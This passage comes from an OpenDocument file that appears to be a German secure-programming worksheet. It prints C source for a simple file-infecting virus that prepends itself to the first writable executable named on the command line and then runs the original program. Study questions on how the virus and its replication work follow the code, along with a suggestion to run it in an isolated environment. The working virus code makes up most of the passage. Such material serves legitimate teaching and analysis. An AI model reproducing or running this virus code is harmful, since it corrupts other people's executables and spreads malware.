      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if ((fd_w = open(tmp, O_CREAT | O_TRUNC | O_RDWR, 00700)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto BAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>while ((len = read(fd_r, buf, BUFSIZ)) &gt; 0)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>write(fd_w, buf, len);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>close(fd_w);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>/* Infect */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>do_infect(argc, argv, fd_r);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>close(fd_r);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if ((pid = fork()) &lt; 0)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto BAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>/* run the original executable */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if (pid == 0) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>execve(tmp, argv, envp);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>exit(127);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>do {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>/* wait till you can cleanup */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>if (waitpid(pid, &amp;status, 0) == -1) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>if (errno != EINTR) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/><text:tab/>rval = -1;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/><text:tab/>goto BAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>} else {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/><text:tab/>rval = status;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/><text:tab/>goto BAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>} while (1);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">BAILOUT:</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>unlink(tmp);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">XBAILOUT:</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>exit(rval);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">void do_infect(int argc, char **argv, int fd_r) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int fd_t;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int target, i;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int done, bytes, length;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>void *map;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>struct stat stat;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>char buf[BUFSIZ];</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if (argc &lt; 2)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>return;</text:span></text:p>
      <text:p text:style-name="code"><text:soft-page-break/><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>/* nail the first executable on the command line */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>for (target = 1; target &lt; argc; target++)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>if (!access(argv[target], W_OK | X_OK))</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>goto NAILED;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>return;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">NAILED:</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if ((fd_t = open(argv[target], O_RDWR)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>return;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>fstat(fd_t, &amp;stat);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>length = stat.st_size;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>map = (char *)malloc(length);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if (!map)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto OUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>/* assume no short reads or writes, nor any failed lseeks */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>for (i = 0; i &lt; length; i++)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>read(fd_t, map + i, 1);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>lseek(fd_t, 0, SEEK_SET);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if (ftruncate(fd_t, 0))</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto OUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>done = 0;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>lseek(fd_r, 0, SEEK_SET);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>while (done &lt; V_OFFSET) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>bytes = read(fd_r, buf, 1);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>write(fd_t, buf, bytes);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>done += bytes;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>for (bytes = 0; bytes &lt; length; bytes++)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>write(fd_t, map + bytes, 1);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>free(map);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">OUT:</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>close(fd_t);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>return;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"></text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1924_390052085"/><text:span text:style-name="T18">Fragen zum Virusprogramm</text:span><text:bookmark-end text:name="__RefHeading__1924_390052085"/></text:h>
      <text:p text:style-name="P33"><text:span text:style-name="T18">1. Was tut dieses Virus-Programm genau?</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">2. Warum muss die Variable static int V_OFFSET = 14056; </text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"><text:tab/>angepasst werden? Nach welchen Kriterien?</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">3. Wie wird die Virus-Vermehrung technisch implementiert?</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">4. Versuchen Sie das Programm in einer “aseptischen„ Umgebung zu starten, um Ihre Analyse zu überprüfen.</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">Literatur</text:span></text:p>
      <text:p text:style-name="P33"><text:soft-page-break/><text:span text:style-name="T18">[1] Teso Security Group Exploiting Format String Vulnerabilities</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">http://julianor.tripod.com/bc/formatstring-1.2.pdf</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72cm" fo:margin-bottom="0.21cm" style:contextual-spacing="false"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top="0.72cm" fo:margin-bottom="0.21cm" style:contextual-spacing="false"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6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size="10pt" style:font-name-asian="Courier New2" style:font-size-asian="10pt" style:font-name-complex="Courier New2"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sicheres programmieren<text:tab/>Arbeitsunterlage</text:p>
      </style:header>
      <style:footer>
        <text:p text:style-name="Footer">Informatik<text:tab/><text:tab/><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12-06-04T14:45:48</meta:creation-date>
    <meta:editing-cycles>28</meta:editing-cycles>
    <meta:editing-duration>PT11H5M30S</meta:editing-duration>
    <meta:initial-creator>Anton Hofmann</meta:initial-creator>
    <dc:date>2013-04-08T11:03:32</dc:date>
    <meta:document-statistic meta:table-count="9" meta:image-count="2" meta:object-count="0" meta:page-count="24" meta:paragraph-count="718" meta:word-count="4173" meta:character-count="30610" meta:non-whitespace-character-count="24668"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
    <meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="arbeitsunterlage" xlink:href="../../../../htl/ab/meineVorlagen/arbeitsunterlage.ott" meta:date="2012-06-04T14:45:48"/>
  </office:meta>
</office:document-meta>
</file>